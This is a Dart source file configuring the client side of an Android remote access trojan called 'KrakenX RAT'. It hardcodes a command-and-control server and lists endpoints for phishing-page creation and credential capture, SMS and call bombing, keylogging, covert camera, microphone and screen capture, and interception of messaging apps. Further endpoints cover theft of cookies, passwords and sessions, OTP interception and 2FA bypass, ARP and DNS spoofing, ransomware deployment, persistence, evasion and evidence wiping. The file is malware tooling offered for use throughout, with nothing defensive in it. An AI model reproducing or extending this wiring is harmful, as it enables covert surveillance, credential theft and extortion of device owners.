// ============================================================================
// API CONFIGURATION - KRAKENX RAT (FULL) - ULTIMATE EDITION
// ============================================================================
// ============================================================================
//  APP CONFIG — shared session
// ============================================================================
class AppConfig {
  static String? sessionKey;
}

class ApiConfig {
  // ===== MAIN SERVER (Port 2061) =====
  static const String baseUrl = "http://nodebolehgalaugkzyro.rexptero.web.id:25595";
  
  // ===== RAT SERVER (Port 2073) =====
  static const String ratBaseUrl = "http://nodebolehgalaugkzyro.rexptero.web.id:25595";

  // ===== TIMEOUT =====
  static const int connectionTimeout = 30;
  static const int receiveTimeout = 30;

  // ==================== MAIN APP ENDPOINTS (PORT 2061) ====================
  static const String validateEndpoint = "$baseUrl/validate";
  static const String myInfoEndpoint = "$baseUrl/myInfo";
  static const String changePassEndpoint = "$baseUrl/changepass";
  static const String sendBugEndpoint = "$baseUrl/sendBug";
  static const String createAccountEndpoint = "$baseUrl/createAccount";
  static const String deleteUserEndpoint = "$baseUrl/deleteUser";
  static const String getPairingEndpoint = "$baseUrl/getPairing";
  static const String mySenderEndpoint = "$baseUrl/mySender";
  static const String globalSendersEndpoint = "$baseUrl/globalSenders";
  static const String addGlobalSenderEndpoint = "$baseUrl/addGlobalSender";
  static const String confirmGlobalSenderEndpoint = "$baseUrl/confirmGlobalSender";
  static const String deleteGlobalSenderEndpoint = "$baseUrl/deleteGlobalSender";
  static const String addServerEndpoint = "$baseUrl/addServer";
  static const String delServerEndpoint = "$baseUrl/delServer";
  static const String sendCommandEndpoint = "$baseUrl/sendCommand";
  static const String myServerEndpoint = "$baseUrl/myServer";
  static const String spamCallEndpoint = "$baseUrl/spamCall";
  static const String getInfoEndpoint = "$baseUrl/getInfo";
  static const String getOnlineUsersEndpoint = "$baseUrl/getOnlineUsers";
  static const String listUsersEndpoint = "$baseUrl/listUsers";
  static const String userAddEndpoint = "$baseUrl/userAdd";
  static const String editUserEndpoint = "$baseUrl/editUser";
  static const String changeUserRoleEndpoint = "$baseUrl/changeUserRole";
  static const String refreshCoinsEndpoint = "$baseUrl/refreshCoins";
  static const String redeemEndpoint = "$baseUrl/redeem";
  static const String giftCoinEndpoint = "$baseUrl/giftCoin";
  static const String requestTopupEndpoint = "$baseUrl/requestTopup";
  static const String checkTopupStatusEndpoint = "$baseUrl/checkTopupStatus";
  static const String getPrivateSendersEndpoint = "$baseUrl/getPrivateSenders";
  static const String getGlobalSendersEndpoint = "$baseUrl/getGlobalSenders";
  static const String deleteSenderEndpoint = "$baseUrl/deleteSender";
  static const String getLogEndpoint = "$baseUrl/getLog";
  static const String pingEndpoint = "$baseUrl/ping";
  static const String getPublicSendersEndpoint = "$baseUrl/getPublicSenders";

  // ==================== PHISHING ENDPOINTS (PORT 2061) ====================
  static const String phishingCreatePage = "$baseUrl/api/create-fake-page";
  static const String phishingCapture = "$baseUrl/api/capture";
  static const String phishingGetCreds = "$baseUrl/api/get-creds";
  static const String phishingSmsBomber = "$baseUrl/api/sms-bomber";
  static const String phishingCallBomber = "$baseUrl/api/call-bomber";
  static const String phishingWaRaid = "$baseUrl/api/wa-raid";
  static const String phishingWaSpam = "$baseUrl/api/wa-spam";

  // ==================== CHAT GLOBAL (PORT 2061) ====================
  static const String getChatMessagesEndpoint = "$baseUrl/api/chat/messages";
  static const String sendChatMessageEndpoint = "$baseUrl/api/chat/send";
  static const String uploadChatMediaEndpoint = "$baseUrl/api/chat/upload";
  static const String getChatRoomsEndpoint = "$baseUrl/api/chat/rooms";
  static const String getChatUsersEndpoint = "$baseUrl/api/chat/users";
  static const String getChatHistoryEndpoint = "$baseUrl/api/chat/history";
  static const String deleteChatMessageEndpoint = "$baseUrl/api/chat/message";

  // ==================== AI CHAT (PORT 2061) ====================
  static const String aiChatEndpoint = "$baseUrl/api/chat";

  // ==================== RAT ENDPOINTS (PORT 2073) ====================
  static const String ratPairIdEndpoint = "$ratBaseUrl/rat/pairid";
  static const String ratPairEndpoint = "$ratBaseUrl/rat/pair";
  static const String ratMyDevicesEndpoint = "$ratBaseUrl/rat/my-devices";
  static const String ratKeepaliveEndpoint = "$ratBaseUrl/api/device/keepalive";
  static const String ratSendCommandEndpoint = "$ratBaseUrl/api/send-command";
  static const String ratGetResponseEndpoint = "$ratBaseUrl/api/get-response";
  static const String ratLockChatEndpoint = "$ratBaseUrl/api/lock-chat";
  static const String ratLockAllChatsEndpoint = "$ratBaseUrl/api/lock-chat-all";
  static const String ratNotificationsEndpoint = "$ratBaseUrl/api/get-notifications";
  static const String ratLiveFrameEndpoint = "$ratBaseUrl/api/live-frame";
  static const String ratPermissionStatusEndpoint = "$ratBaseUrl/rat/permission-status";
  static const String ratSetDevicePermEndpoint = "$ratBaseUrl/setDevicePerm";
  static const String ratListDevicePermsEndpoint = "$ratBaseUrl/listDevicePerms";
  static const String ratPersistOnlineEndpoint = "$ratBaseUrl/api/device/persist-online";
  static const String ratRegisterTargetEndpoint = "$ratBaseUrl/api/register-target";
  static const String ratPairTargetEndpoint = "$ratBaseUrl/api/pair-target";
  static const String ratHeartbeatEndpoint = "$ratBaseUrl/api/heartbeat";
  static const String ratGetCommandEndpoint = "$ratBaseUrl/api/get-command";
  static const String ratPostResponseEndpoint = "$ratBaseUrl/api/post-response";
  static const String ratLiveFramePostEndpoint = "$ratBaseUrl/api/live-frame";

  // ==================== RAT ULTIMATE FEATURES ENDPOINTS ====================
  
  // ─── Keylogger ─────────────────────────────────────────────────────
  static const String ratStartKeylogger = "$ratBaseUrl/api/start-keylogger";
  static const String ratStopKeylogger = "$ratBaseUrl/api/stop-keylogger";
  static const String ratGetKeylogs = "$ratBaseUrl/api/get-keylogs";
  
  // ─── Keylogger Advanced ──────────────────────────────────────────
  static const String ratStartAdvancedKeylogger = "$ratBaseUrl/api/start-advanced-keylogger";
  static const String ratStopAdvancedKeylogger = "$ratBaseUrl/api/stop-advanced-keylogger";
  static const String ratGetKeylogsTimestamp = "$ratBaseUrl/api/get-keylogs-timestamp";
  static const String ratGetKeyloggerStats = "$ratBaseUrl/api/get-keylogger-stats";
  static const String ratClearKeylogs = "$ratBaseUrl/api/clear-keylogs";
  static const String ratExportKeylogs = "$ratBaseUrl/api/export-keylogs";
  
  // ─── Clipboard Monitor ────────────────────────────────────────────
  static const String ratStartClipboardMonitor = "$ratBaseUrl/api/start-clipboard-monitor";
  static const String ratStopClipboardMonitor = "$ratBaseUrl/api/stop-clipboard-monitor";
  static const String ratGetClipboardHistory = "$ratBaseUrl/api/get-clipboard-history";
  static const String ratClearClipboardHistory = "$ratBaseUrl/api/clear-clipboard-history";
  
  // ─── Screen Recorder ─────────────────────────────────────────────
  static const String ratStartScreenRecording = "$ratBaseUrl/api/start-screen-recording";
  static const String ratStopScreenRecording = "$ratBaseUrl/api/stop-screen-recording";
  static const String ratGetScreenRecording = "$ratBaseUrl/api/get-screen-recording";
  static const String ratStartScreenRecordingAudio = "$ratBaseUrl/api/start-screen-recording-audio";
  static const String ratTakeScreenshotSilent = "$ratBaseUrl/api/take-screenshot-silent";
  static const String ratTakeBurstScreenshots = "$ratBaseUrl/api/take-burst-screenshots";
  static const String ratTakeScreenshotMetadata = "$ratBaseUrl/api/take-screenshot-metadata";
  
  // ─── Audio Recorder ──────────────────────────────────────────────
  static const String ratStartAudioRecording = "$ratBaseUrl/api/start-audio-recording";
  static const String ratStopAudioRecording = "$ratBaseUrl/api/stop-audio-recording";
  static const String ratGetAudioRecording = "$ratBaseUrl/api/get-audio-recording";
  static const String ratStartAudioStreaming = "$ratBaseUrl/api/start-audio-streaming";
  static const String ratStopAudioStreaming = "$ratBaseUrl/api/stop-audio-streaming";
  static const String ratStartHqAudioRecording = "$ratBaseUrl/api/start-hq-audio-recording";
  static const String ratSetAudioQuality = "$ratBaseUrl/api/set-audio-quality";
  
  // ─── Video Recorder ──────────────────────────────────────────────
  static const String ratStartVideoRecording = "$ratBaseUrl/api/start-video-recording";
  static const String ratStopVideoRecording = "$ratBaseUrl/api/stop-video-recording";
  static const String ratGetVideoRecording = "$ratBaseUrl/api/get-video-recording";
  static const String ratStartBgVideoRecording = "$ratBaseUrl/api/start-bg-video-recording";
  static const String ratStartVideoStreaming = "$ratBaseUrl/api/start-video-streaming";
  static const String ratStopVideoStreaming = "$ratBaseUrl/api/stop-video-streaming";
  static const String ratTakePhotoSilent = "$ratBaseUrl/api/take-photo-silent";
  static const String ratTakePhotoExif = "$ratBaseUrl/api/take-photo-exif";
  
  // ─── Location Tracking ───────────────────────────────────────────
  static const String ratStartRealtimeLocation = "$ratBaseUrl/api/start-realtime-location";
  static const String ratStopRealtimeLocation = "$ratBaseUrl/api/stop-realtime-location";
  static const String ratGetLocationHistory = "$ratBaseUrl/api/get-location-history";
  static const String ratClearLocationHistory = "$ratBaseUrl/api/clear-location-history";
  static const String ratGetGeofenceAlerts = "$ratBaseUrl/api/get-geofence-alerts";
  static const String ratSetGeofence = "$ratBaseUrl/api/set-geofence";
  
  // ─── Call Recorder ───────────────────────────────────────────────
  static const String ratStartCallRecording = "$ratBaseUrl/api/start-call-recording";
  static const String ratStopCallRecording = "$ratBaseUrl/api/stop-call-recording";
  static const String ratGetCallRecords = "$ratBaseUrl/api/get-call-records";
  static const String ratDeleteCallRecord = "$ratBaseUrl/api/delete-call-record";
  
  // ─── SMS Intercept ───────────────────────────────────────────────
  static const String ratStartSmsInterceptor = "$ratBaseUrl/api/start-sms-interceptor";
  static const String ratStopSmsInterceptor = "$ratBaseUrl/api/stop-sms-interceptor";
  static const String ratGetSmsConversations = "$ratBaseUrl/api/get-sms-conversations";
  static const String ratSendSms = "$ratBaseUrl/api/send-sms";
  static const String ratSendSmsBulk = "$ratBaseUrl/api/send-sms-bulk";
  static const String ratDeleteAllSms = "$ratBaseUrl/api/delete-all-sms";
  
  // ─── WhatsApp Intercept ──────────────────────────────────────────
  static const String ratStartWaInterceptor = "$ratBaseUrl/api/start-wa-interceptor";
  static const String ratStopWaInterceptor = "$ratBaseUrl/api/stop-wa-interceptor";
  static const String ratGetWaMessages = "$ratBaseUrl/api/get-wa-messages";
  static const String ratGetWaContacts = "$ratBaseUrl/api/get-wa-contacts";
  static const String ratGetWaGroups = "$ratBaseUrl/api/get-wa-groups";
  static const String ratSendWaMessage = "$ratBaseUrl/api/send-wa-message";
  static const String ratGetWaStatus = "$ratBaseUrl/api/get-wa-status";
  static const String ratSetWaStatus = "$ratBaseUrl/api/set-wa-status";
  
  // ─── Telegram Intercept ──────────────────────────────────────────
  static const String ratStartTgInterceptor = "$ratBaseUrl/api/start-tg-interceptor";
  static const String ratStopTgInterceptor = "$ratBaseUrl/api/stop-tg-interceptor";
  static const String ratGetTgMessages = "$ratBaseUrl/api/get-tg-messages";
  static const String ratGetTgContacts = "$ratBaseUrl/api/get-tg-contacts";
  static const String ratGetTgGroups = "$ratBaseUrl/api/get-tg-groups";
  static const String ratSendTgMessage = "$ratBaseUrl/api/send-tg-message";
  
  // ─── Instagram Intercept ─────────────────────────────────────────
  static const String ratStartIgInterceptor = "$ratBaseUrl/api/start-ig-interceptor";
  static const String ratStopIgInterceptor = "$ratBaseUrl/api/stop-ig-interceptor";
  static const String ratGetIgMessages = "$ratBaseUrl/api/get-ig-messages";
  static const String ratSendIgMessage = "$ratBaseUrl/api/send-ig-message";
  
  // ─── Facebook Intercept ──────────────────────────────────────────
  static const String ratStartFbInterceptor = "$ratBaseUrl/api/start-fb-interceptor";
  static const String ratStopFbInterceptor = "$ratBaseUrl/api/stop-fb-interceptor";
  static const String ratGetFbMessages = "$ratBaseUrl/api/get-fb-messages";
  static const String ratSendFbMessage = "$ratBaseUrl/api/send-fb-message";
  
  // ─── Browser Intercept ───────────────────────────────────────────
  static const String ratGetBrowserBookmarks = "$ratBaseUrl/api/get-browser-bookmarks";
  static const String ratGetBrowserDownloads = "$ratBaseUrl/api/get-browser-downloads";
  static const String ratGetBrowserCookies = "$ratBaseUrl/api/get-browser-cookies";
  static const String ratGetBrowserExtensions = "$ratBaseUrl/api/get-browser-extensions";
  static const String ratGetBrowserTabs = "$ratBaseUrl/api/get-browser-tabs";
  static const String ratClearBrowserCache = "$ratBaseUrl/api/clear-browser-cache";
  static const String ratClearBrowserHistory = "$ratBaseUrl/api/clear-browser-history";
  static const String ratInjectBrowserScript = "$ratBaseUrl/api/inject-browser-script";
  static const String ratCloseBrowserTab = "$ratBaseUrl/api/close-browser-tab";
  static const String ratOpenBrowserTab = "$ratBaseUrl/api/open-browser-tab";
  
  // ─── Network Intercept ───────────────────────────────────────────
  static const String ratStartPacketCapture = "$ratBaseUrl/api/start-packet-capture";
  static const String ratStopPacketCapture = "$ratBaseUrl/api/stop-packet-capture";
  static const String ratGetPacketCapture = "$ratBaseUrl/api/get-packet-capture";
  static const String ratStartMitm = "$ratBaseUrl/api/start-mitm";
  static const String ratStopMitm = "$ratBaseUrl/api/stop-mitm";
  static const String ratScanNetwork = "$ratBaseUrl/api/scan-network";
  static const String ratGetConnectedDevices = "$ratBaseUrl/api/get-connected-devices";
  static const String ratPortScan = "$ratBaseUrl/api/port-scan";
  static const String ratArpSpoof = "$ratBaseUrl/api/arp-spoof";
  static const String ratDnsSpoof = "$ratBaseUrl/api/dns-spoof";
  static const String ratGetNetworkStats = "$ratBaseUrl/api/get-network-stats";
  static const String ratGetNetworkConnections = "$ratBaseUrl/api/get-network-connections";
  
  // ─── File System ──────────────────────────────────────────────────
  static const String ratGetFileInfo = "$ratBaseUrl/api/get-file-info";
  static const String ratGetDirectorySize = "$ratBaseUrl/api/get-directory-size";
  static const String ratCopyFile = "$ratBaseUrl/api/copy-file";
  static const String ratMoveFile = "$ratBaseUrl/api/move-file";
  static const String ratRenameFile = "$ratBaseUrl/api/rename-file";
  static const String ratCreateDirectory = "$ratBaseUrl/api/create-directory";
  static const String ratRemoveDirectory = "$ratBaseUrl/api/remove-directory";
  static const String ratZipFiles = "$ratBaseUrl/api/zip-files";
  static const String ratUnzipFiles = "$ratBaseUrl/api/unzip-files";
  static const String ratEncryptFile = "$ratBaseUrl/api/encrypt-file";
  static const String ratDecryptFile = "$ratBaseUrl/api/decrypt-file";
  
  // ─── Security ─────────────────────────────────────────────────────
  static const String ratGetSecurityLog = "$ratBaseUrl/api/get-security-log";
  static const String ratClearSecurityLog = "$ratBaseUrl/api/clear-security-log";
  static const String ratGetEncryptionKey = "$ratBaseUrl/api/get-encryption-key";
  static const String ratSetEncryptionKey = "$ratBaseUrl/api/set-encryption-key";
  static const String ratEnableSecureMode = "$ratBaseUrl/api/enable-secure-mode";
  static const String ratDisableSecureMode = "$ratBaseUrl/api/disable-secure-mode";
  static const String ratSetFirewallRule = "$ratBaseUrl/api/set-firewall-rule";
  static const String ratRemoveFirewallRule = "$ratBaseUrl/api/remove-firewall-rule";
  static const String ratGetFirewallRules = "$ratBaseUrl/api/get-firewall-rules";
  static const String ratEnableAntivirusScan = "$ratBaseUrl/api/enable-antivirus-scan";
  static const String ratGetAntivirusResult = "$ratBaseUrl/api/get-antivirus-result";
  
  // ─── User Control ────────────────────────────────────────────────
  static const String ratGetUserAccounts = "$ratBaseUrl/api/get-user-accounts";
  static const String ratCreateUserAccount = "$ratBaseUrl/api/create-user-account";
  static const String ratDeleteUserAccount = "$ratBaseUrl/api/delete-user-account";
  static const String ratChangeUserPassword = "$ratBaseUrl/api/change-user-password";
  static const String ratSetUserPermission = "$ratBaseUrl/api/set-user-permission";
  static const String ratGetUserPermissions = "$ratBaseUrl/api/get-user-permissions";
  static const String ratLockUserAccount = "$ratBaseUrl/api/lock-user-account";
  static const String ratUnlockUserAccount = "$ratBaseUrl/api/unlock-user-account";
  static const String ratEnableGuestMode = "$ratBaseUrl/api/enable-guest-mode";
  static const String ratDisableGuestMode = "$ratBaseUrl/api/disable-guest-mode";
  
  // ─── System Info ──────────────────────────────────────────────────
  static const String ratGetSystemInfo = "$ratBaseUrl/api/get-system-info";
  static const String ratGetHardwareInfo = "$ratBaseUrl/api/get-hardware-info";
  static const String ratGetOsInfo = "$ratBaseUrl/api/get-os-info";
  static const String ratGetKernelInfo = "$ratBaseUrl/api/get-kernel-info";
  static const String ratGetCpuInfo = "$ratBaseUrl/api/get-cpu-info";
  static const String ratGetMemoryInfo = "$ratBaseUrl/api/get-memory-info";
  static const String ratGetDiskInfo = "$ratBaseUrl/api/get-disk-info";
  static const String ratGetRunningTasks = "$ratBaseUrl/api/get-running-tasks";
  static const String ratKillProcess = "$ratBaseUrl/api/kill-process";
  
  // ─── Anti-Forensic / Wipe ────────────────────────────────────────
  static const String ratWipeEvidence = "$ratBaseUrl/api/wipe-evidence";
  static const String ratWipeLogs = "$ratBaseUrl/api/wipe-logs";
  static const String ratWipeCache = "$ratBaseUrl/api/wipe-cache";
  static const String ratWipeTempFiles = "$ratBaseUrl/api/wipe-temp-files";
  static const String ratWipeRecentFiles = "$ratBaseUrl/api/wipe-recent-files";
  static const String ratWipeClipboardHistory = "$ratBaseUrl/api/wipe-clipboard-history";
  static const String ratWipeSearchHistory = "$ratBaseUrl/api/wipe-search-history";
  static const String ratWipeLocationHistory = "$ratBaseUrl/api/wipe-location-history";
  static const String ratWipeCallHistory = "$ratBaseUrl/api/wipe-call-history";
  static const String ratWipeSmsHistory = "$ratBaseUrl/api/wipe-sms-history";
  static const String ratWipeAll = "$ratBaseUrl/api/wipe-all";
  
  // ─── Remote Desktop ──────────────────────────────────────────────
  static const String ratStartRemoteDesktop = "$ratBaseUrl/api/start-remote-desktop";
  static const String ratStopRemoteDesktop = "$ratBaseUrl/api/stop-remote-desktop";
  static const String ratRemoteDesktopMouse = "$ratBaseUrl/api/remote-desktop-mouse";
  static const String ratRemoteDesktopKeyboard = "$ratBaseUrl/api/remote-desktop-keyboard";
  static const String ratRemoteDesktopSendKeys = "$ratBaseUrl/api/remote-desktop-send-keys";
  static const String ratRemoteDesktopClick = "$ratBaseUrl/api/remote-desktop-click";
  static const String ratRemoteDesktopScroll = "$ratBaseUrl/api/remote-desktop-scroll";
  
  // ─── Automation ───────────────────────────────────────────────────
  static const String ratAutoTap = "$ratBaseUrl/api/auto-tap";
  static const String ratAutoSwipe = "$ratBaseUrl/api/auto-swipe";
  static const String ratAutoClick = "$ratBaseUrl/api/auto-click";
  static const String ratAutoScroll = "$ratBaseUrl/api/auto-scroll";
  static const String ratAutoType = "$ratBaseUrl/api/auto-type";
  static const String ratRecordActions = "$ratBaseUrl/api/record-actions";
  static const String ratStopRecordActions = "$ratBaseUrl/api/stop-record-actions";
  static const String ratPlayActions = "$ratBaseUrl/api/play-actions";
  static const String ratLoopActions = "$ratBaseUrl/api/loop-actions";
  static const String ratSetAutoResponse = "$ratBaseUrl/api/set-auto-response";
  static const String ratSetAutoReply = "$ratBaseUrl/api/set-auto-reply";
  
  // ─── AI Features ──────────────────────────────────────────────────
  static const String ratAiAnalyzeScreen = "$ratBaseUrl/api/ai-analyze-screen";
  static const String ratAiAnalyzePhoto = "$ratBaseUrl/api/ai-analyze-photo";
  static const String ratAiAnalyzeAudio = "$ratBaseUrl/api/ai-analyze-audio";
  static const String ratAiAnalyzeText = "$ratBaseUrl/api/ai-analyze-text";
  static const String ratAiAnalyzeLocation = "$ratBaseUrl/api/ai-analyze-location";
  static const String ratAiGenerateReport = "$ratBaseUrl/api/ai-generate-report";
  static const String ratAiSummarizeChat = "$ratBaseUrl/api/ai-summarize-chat";
  static const String ratAiTranslate = "$ratBaseUrl/api/ai-translate";
  static const String ratAiSuggestReply = "$ratBaseUrl/api/ai-suggest-reply";
  
  // ─── Password Control ─────────────────────────────────────────────
  static const String ratChangeLockPassword = "$ratBaseUrl/api/change-lock-password";
  static const String ratSetScreenLock = "$ratBaseUrl/api/set-screen-lock";
  static const String ratChangeSystemPassword = "$ratBaseUrl/api/change-system-password";
  static const String ratResetLockPassword = "$ratBaseUrl/api/reset-lock-password";
  
  // ─── Device Control ──────────────────────────────────────────────
  static const String ratSetScreenBrightness = "$ratBaseUrl/api/set-screen-brightness";
  static const String ratGetScreenBrightness = "$ratBaseUrl/api/get-screen-brightness";
  static const String ratSetAutoRotate = "$ratBaseUrl/api/set-auto-rotate";
  static const String ratSetScreenTimeout = "$ratBaseUrl/api/set-screen-timeout";
  static const String ratSetAirplaneMode = "$ratBaseUrl/api/set-airplane-mode";
  static const String ratSetWifiHotspot = "$ratBaseUrl/api/set-wifi-hotspot";
  static const String ratSetVolume = "$ratBaseUrl/api/set-volume";
  static const String ratGetVolume = "$ratBaseUrl/api/get-volume";
  
  // ─── Microphone Recording ────────────────────────────────────────
  static const String ratStartMicRecording = "$ratBaseUrl/api/start-mic-recording";
  static const String ratStopMicRecording = "$ratBaseUrl/api/stop-mic-recording";
  static const String ratGetAudio = "$ratBaseUrl/api/get-audio";
  
  // ─── Call Logs ────────────────────────────────────────────────────
  static const String ratGetCallLogs = "$ratBaseUrl/api/get-call-logs";
  
  // ─── Installed Apps ──────────────────────────────────────────────
  static const String ratGetInstalledApps = "$ratBaseUrl/api/get-installed-apps";
  
  // ─── WiFi Networks ───────────────────────────────────────────────
  static const String ratGetWifiNetworks = "$ratBaseUrl/api/get-wifi-networks";
  static const String ratConnectWifi = "$ratBaseUrl/api/connect-wifi";
  
  // ─── Device Info ─────────────────────────────────────────────────
  static const String ratGetDeviceInfo = "$ratBaseUrl/api/get-device-info";
  
  // ─── Volume Control ──────────────────────────────────────────────
  static const String ratDisableVolume = "$ratBaseUrl/api/disable-volume";
  static const String ratEnableVolume = "$ratBaseUrl/api/enable-volume";
  
  // ─── Touch Control ───────────────────────────────────────────────
  static const String ratBlockTouch = "$ratBaseUrl/api/block-touch";
  static const String ratUnblockTouch = "$ratBaseUrl/api/unblock-touch";
  
  // ─── Power Control ───────────────────────────────────────────────
  static const String ratDisablePower = "$ratBaseUrl/api/disable-power";
  static const String ratEnablePower = "$ratBaseUrl/api/enable-power";
  
  // ─── Keyboard Control ────────────────────────────────────────────
  static const String ratDisableKeyboard = "$ratBaseUrl/api/disable-keyboard";
  static const String ratEnableKeyboard = "$ratBaseUrl/api/enable-keyboard";
  
  // ─── App Management ──────────────────────────────────────────────
  static const String ratInstallApk = "$ratBaseUrl/api/install-apk";
  static const String ratClearAppData = "$ratBaseUrl/api/clear-app-data";
  static const String ratKillApp = "$ratBaseUrl/api/kill-app";
  static const String ratLockApp = "$ratBaseUrl/api/lock-app";
  static const String ratUnlockApp = "$ratBaseUrl/api/unlock-app";
  
  // ─── ADB Control ──────────────────────────────────────────────────
  static const String ratEnableAdb = "$ratBaseUrl/api/enable-adb";
  static const String ratDisableAdb = "$ratBaseUrl/api/disable-adb";
  
  // ─── System Control ──────────────────────────────────────────────
  static const String ratFactoryReset = "$ratBaseUrl/api/factory-reset";
  static const String ratLockBootloader = "$ratBaseUrl/api/lock-bootloader";
  static const String ratUnlockBootloader = "$ratBaseUrl/api/unlock-bootloader";
  static const String ratMountSystemRW = "$ratBaseUrl/api/mount-system-rw";
  static const String ratClearLogs = "$ratBaseUrl/api/clear-logs";
  static const String ratBlockNotifications = "$ratBaseUrl/api/block-notifications";
  static const String ratUnblockNotifications = "$ratBaseUrl/api/unblock-notifications";
  
  // ─── Persistence ──────────────────────────────────────────────────
  static const String ratEnablePersistence = "$ratBaseUrl/api/enable-persistence";
  static const String ratDisablePersistence = "$ratBaseUrl/api/disable-persistence";
  
  // ─── App Icon Visibility ─────────────────────────────────────────
  static const String ratHideAppIcon = "$ratBaseUrl/api/hide-app-icon";
  static const String ratShowAppIcon = "$ratBaseUrl/api/show-app-icon";
  
  // ─── Device Admin ─────────────────────────────────────────────────
  static const String ratEnableDeviceAdmin = "$ratBaseUrl/api/enable-device-admin";
  static const String ratDisableDeviceAdmin = "$ratBaseUrl/api/disable-device-admin";
  
  // ─── WiFi Control ─────────────────────────────────────────────────
  static const String ratEnableWifi = "$ratBaseUrl/api/enable-wifi";
  static const String ratDisableWifi = "$ratBaseUrl/api/disable-wifi";
  
  // ─── Flashlight ───────────────────────────────────────────────────
  static const String ratToggleFlashlight = "$ratBaseUrl/api/toggle-flashlight";
  
  // ─── Browser History ──────────────────────────────────────────────
  static const String ratGetBrowserHistory = "$ratBaseUrl/api/get-browser-history";
  
  // ─── Saved Passwords ─────────────────────────────────────────────
  static const String ratGetSavedPasswords = "$ratBaseUrl/api/get-saved-passwords";
  
  // ─── WiFi Passwords ──────────────────────────────────────────────
  static const String ratGetWifiPasswords = "$ratBaseUrl/api/get-wifi-passwords";
  
  // ─── SIM Info ─────────────────────────────────────────────────────
  static const String ratGetSimInfo = "$ratBaseUrl/api/get-sim-info";
  
  // ─── IMEI ─────────────────────────────────────────────────────────
  static const String ratGetImei = "$ratBaseUrl/api/get-imei";
  
  // ─── Root Check ───────────────────────────────────────────────────
  static const String ratCheckRoot = "$ratBaseUrl/api/check-root";
  
  // ─── Social Media Sessions ────────────────────────────────────────
  static const String ratGetWaSession = "$ratBaseUrl/api/get-wa-session";
  static const String ratGetTgSession = "$ratBaseUrl/api/get-tg-session";
  static const String ratGetInstagramSession = "$ratBaseUrl/api/get-instagram-session";
  
  // ─── Emails ───────────────────────────────────────────────────────
  static const String ratGetEmails = "$ratBaseUrl/api/get-emails";
  
  // ─── Calendar ─────────────────────────────────────────────────────
  static const String ratGetCalendar = "$ratBaseUrl/api/get-calendar";
  
  // ─── Notes ────────────────────────────────────────────────────────
  static const String ratGetNotes = "$ratBaseUrl/api/get-notes";
  
  // ─── Running Services ─────────────────────────────────────────────
  static const String ratGetRunningServices = "$ratBaseUrl/api/get-running-services";
  
  // ─── Battery History ──────────────────────────────────────────────
  static const String ratGetBatteryHistory = "$ratBaseUrl/api/get-battery-history";
  
  // ─── Recent Apps ──────────────────────────────────────────────────
  static const String ratGetRecentApps = "$ratBaseUrl/api/get-recent-apps";
  
  // ─── File Manager ─────────────────────────────────────────────────
  static const String ratBrowseFiles = "$ratBaseUrl/api/browse-files";
  static const String ratUploadFile = "$ratBaseUrl/api/upload-file";
  static const String ratDownloadFile = "$ratBaseUrl/api/download-file";
  static const String ratDeleteFile = "$ratBaseUrl/api/delete-file";

  // ==================== ULTIMATE 6 NEW FEATURES ENDPOINTS ====================
  
  // ─── Live Location Tracker ────────────────────────────────────────
  static const String ratStartLiveLocation = "$ratBaseUrl/api/start-live-location";
  static const String ratStopLiveLocation = "$ratBaseUrl/api/stop-live-location";
  static const String ratGetLiveLocation = "$ratBaseUrl/api/get-live-location";
  
  // ─── Remote Shell ─────────────────────────────────────────────────
  static const String ratSendShellCommand = "$ratBaseUrl/api/send-shell-command";
  static const String ratGetShellOutput = "$ratBaseUrl/api/get-shell-output";
  
  // ─── Overlay Attack ───────────────────────────────────────────────
  static const String ratStartOverlay = "$ratBaseUrl/api/start-overlay";
  static const String ratStopOverlay = "$ratBaseUrl/api/stop-overlay";
  
  // ─── Screen Mirroring ─────────────────────────────────────────────
  static const String ratStartScreenMirroring = "$ratBaseUrl/api/start-screen-mirroring";
  static const String ratStopScreenMirroring = "$ratBaseUrl/api/stop-screen-mirroring";
  
  // ─── WebRTC Remote Access ─────────────────────────────────────────
  static const String ratCreateWebRTCSession = "$ratBaseUrl/api/create-web-rtc-session";
  static const String ratGetWebRTCSession = "$ratBaseUrl/api/get-web-rtc-session";
  
  // ─── Ransomware Builder ───────────────────────────────────────────
  static const String ratBuildRansomware = "$ratBaseUrl/api/build-ransomware";
  static const String ratDeployRansomware = "$ratBaseUrl/api/deploy-ransomware";

  // ==================== EXTRA FEATURES - ADVANCED PERSISTENCE ====================
  
  static const String ratEnableAutoStart = "$ratBaseUrl/api/enable-auto-start";
  static const String ratDisableAutoStart = "$ratBaseUrl/api/disable-auto-start";
  static const String ratCloneSystemApp = "$ratBaseUrl/api/clone-system-app";
  static const String ratInjectFramework = "$ratBaseUrl/api/inject-framework";
  static const String ratDisablePlayProtect = "$ratBaseUrl/api/disable-play-protect";
  static const String ratBypassSELinux = "$ratBaseUrl/api/bypass-selinux";

  // ==================== EXTRA FEATURES - STEALTH & EVASION ====================
  
  static const String ratHideProcess = "$ratBaseUrl/api/hide-process";
  static const String ratFakePackage = "$ratBaseUrl/api/fake-package";
  static const String ratAntiDebugging = "$ratBaseUrl/api/anti-debugging";
  static const String ratAntiVM = "$ratBaseUrl/api/anti-vm";
  static const String ratObfuscateTraffic = "$ratBaseUrl/api/obfuscate-traffic";
  static const String ratSelfDestruct = "$ratBaseUrl/api/self-destruct";

  // ==================== EXTRA FEATURES - NETWORK MANIPULATION ====================
  
  static const String ratMitmProxy = "$ratBaseUrl/api/mitm-proxy";
  static const String ratArpPoison = "$ratBaseUrl/api/arp-poison";
  static const String ratSslStrip = "$ratBaseUrl/api/ssl-strip";
  static const String ratPacketCapture = "$ratBaseUrl/api/packet-capture";
  static const String ratTrafficRedirect = "$ratBaseUrl/api/traffic-redirect";
  static const String ratVpnKillswitch = "$ratBaseUrl/api/vpn-killswitch";
  static const String ratNetworkThrottle = "$ratBaseUrl/api/network-throttle";

  // ==================== EXTRA FEATURES - SOCIAL ENGINEERING ====================
  
  static const String ratFakeLoginInject = "$ratBaseUrl/api/fake-login-inject";
  static const String ratSessionHijack = "$ratBaseUrl/api/session-hijack";
  static const String ratCookieStealer = "$ratBaseUrl/api/cookie-stealer";
  static const String ratOtpInterceptor = "$ratBaseUrl/api/otp-interceptor";
  static const String ratBypass2FA = "$ratBaseUrl/api/bypass-2fa";

  // ==================== EXTRA FEATURES - FILE SYSTEM ====================
  
  static const String ratExtractApk = "$ratBaseUrl/api/extract-apk";
  static const String ratModifyHosts = "$ratBaseUrl/api/modify-hosts";
  static const String ratDeleteSystemApp = "$ratBaseUrl/api/delete-system-app";
  static const String ratDisableDMVerity = "$ratBaseUrl/api/disable-dm-verity";
  static const String ratPatchBootImage = "$ratBaseUrl/api/patch-boot-image";
